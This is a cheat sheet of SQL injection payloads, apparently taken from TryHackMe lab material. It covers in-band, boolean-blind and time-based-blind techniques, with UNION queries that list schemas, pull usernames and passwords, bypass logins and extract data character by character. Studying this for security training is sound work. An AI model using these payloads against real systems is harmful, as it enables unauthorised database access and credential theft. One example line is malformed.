# SQL Injection commands Cheatsheet

Source  THM

## Inband SLQi

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just 
refers to the same method of communication being used to exploit the 
vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

- display error message

```sql
' or using 1 UNION SELECT 1
```

- get database name



```sql
1 UNION SELECT 1,2,database()
```

- get list of tables in the database

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

- get structure of tables

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

- get user credentials from db

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

## Blind SQLi - Authentication Bypass

Blind SQLi is when we get little to no feedback to confirm whether our injected 
queries were, in fact, successful or not, this is because the error 
messages have been disabled, but the injection still works regardless.

We can test using the following payload;

```
' OR 1=1--
```

## Blind SQLi - Boolean based

Boolean-based SQL Injection refers to the response we receive from our injection 
attempts, which could be a true/false, yes/no, on/off, 1/0 or any 
response that can only have two outcomes. That outcome 
confirms that our SQL Injection payload was either successful or 
not. On the first inspection, you may feel like this limited response 
can't provide much information. Still, with just these two 
responses, it's possible to enumerate a whole database structure and 
contents.

- check number of columns in the DB ( we keep adding column numbers until we get response as true.)

```
admin123' UNION SELECT 1,2,...n;--
```

- Get database name (we cycle through different letters until we get true as the result for each letter. e.g. 's-q-l-i%' **sqli_three**)

```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

- Enumerate table names (we cycle through different letters until we get true as the result for each letter. e.g. 'u-s-e-r%' **user**)

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

- To get users and their password, 

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

## Blind SQLi - Time Based

A time-based blind SQL injection is very similar to the above Boolean-based one in that the same requests are sent, but there is no visual 
indicator of your queries being wrong or right this time. Instead, your 
indicator of a correct query is based on the time the query takes to 
complete. This time delay is introduced using built-in methods such 
as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

- Check number of columns in a table (we add columns until the time delay occurs.)

```sql
admin123' UNION SELECT SLEEP(5),2,...;--
```

- Getting usernames and passwords

```sql
admin123' UNION SELECT SLEEP(5),2,3 from users where username='admin' and password= '4961';--'
```


